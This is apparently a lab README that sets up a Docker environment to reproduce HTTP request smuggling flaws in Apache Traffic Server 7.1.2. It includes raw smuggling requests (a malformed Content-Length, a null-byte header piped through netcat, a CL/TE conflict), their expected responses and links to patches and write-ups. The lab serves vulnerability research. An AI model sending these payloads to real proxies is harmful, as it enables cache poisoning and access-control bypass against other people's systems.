#	LAB2

##	Composition

1.Apache Traffic Server 7.1.2

2.mattrayner/lamp:latest-1804

3.fbraz3/lnmp:7.1

```
                        +---[8080]---+
                        | 9010->8080 |
                        |    ATS7    |
                        |            |
                        +---+---+----+
                 [lamp.com] |   | [lnmp.com]
                    +-------+   +-------+
                    |                   |
              +---[80]-----+     +---[80]-----+
              | 9011->80   |     | 9012->80   |
              |  LAMP      |     |  LNMP      |
              |            |     |            |
              +-----+------+     +----+-------+
```



LNMP index.php:

```php
<?php
echo 'This is Nginx<br>';
if (!function_exists('getallheaders')) {

    function getallheaders() {
        $headers = array();
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }

}
var_dump(getallheaders());
$data = file_get_contents("php://input");
print_r($data);
```



LAMP index.php:

```php
<?php
echo 'This is LAMP:80<br>';
var_dump(getallheaders());
$data = file_get_contents("php://input");
print_r($data);
```



##	Usage

###	build

```bash
docker-compose up
```



###	check

```bash
$ chmod +x check.sh;./check.sh|grep HTTP
HTTP/1.1 200 OK
HTTP/1.1 200 OK
</pre>HTTP/1.1 200 OK
HTTP/1.1 200 OK
```

4 HTTP code 200 means all right! 

Enjoy!



##	POC

###	First Patch

https://github.com/apache/trafficserver/pull/3192 

> Return 400 if there is whitespace after the field name and before the colon

Use burp or other tools to send this:

```http
GET / HTTP/1.1
Host: lnmp.com
Content-Length : 47

GET / HTTP/1.1
Host: lnmp.com
attack: 1
foo:
```

You will get response like this. **If not, you should try one more time.**

```http
HTTP/1.1 200 OK
Server: ATS/7.1.2
Date: Wed, 29 Apr 2020 10:50:00 GMT
Content-Type: text/html; charset=UTF-8
Age: 0
Connection: keep-alive
Content-Length: 385

This is Nginx<br>array(7) {
  ["Via"]=>
  string(87) "http/1.1 27ae0e316043[40950c2a-a8ce-4ecb-8781-48ee331e5c8e] (ApacheTrafficServer/7.1.2)"
  ["X-Forwarded-For"]=>
  string(10) "172.21.0.1"
  ["Foo"]=>
  string(14) "GET / HTTP/1.1"
  ["Attack"]=>
  string(1) "1"
  ["Host"]=>
  string(14) "linkedlnmp.net"
  ["Content-Length"]=>
  string(0) ""
  ["Content-Type"]=>
  string(0) ""
}

```

Explanation: https://paper.seebug.org/1049/#431-first-patch



###	Second Patch

https://github.com/apache/trafficserver/pull/3201

> Close the connection when returning a 400 error response

Use netcat to excute this.

```bash
printf 'GET / HTTP/1.1\r\n'\
'Host: lnmp.com\r\n'\
'aa: \0GET /2333 HTTP/1.1\r\n'\
'Host: lnmp.com\r\n'\
'\r\n'\
| nc 127.0.0.1 9010
```

You will get two 400 responses.

Explanation: https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc8

https://paper.seebug.org/1049/#432-second-patch



###	Third Patch

https://github.com/apache/trafficserver/pull/3231

> 3231 Validate Content-Length headers for incoming requests

Use burp or other tools to send this:

```http
GET / HTTP/1.1
Host: lnmp.com
Content-Length:6
Transfer-Encoding: chunked

0

G
```

You will get response like this. **If not, you should try one more time.**

```http
HTTP/1.1 405 Not Allowed
Server: ATS/7.1.2
Date: Wed, 29 Apr 2020 11:19:42 GMT
Content-Type: text/html
Content-Length: 182
Age: 0
Connection: keep-alive

<html>
<head><title>405 Not Allowed</title></head>
<body bgcolor="white">
<center><h1>405 Not Allowed</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```



###	Fourth Patch

https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc10

https://paper.seebug.org/1049/#434-fourth-patch



#	Reference

https://paper.seebug.org/1049/#42-test-environment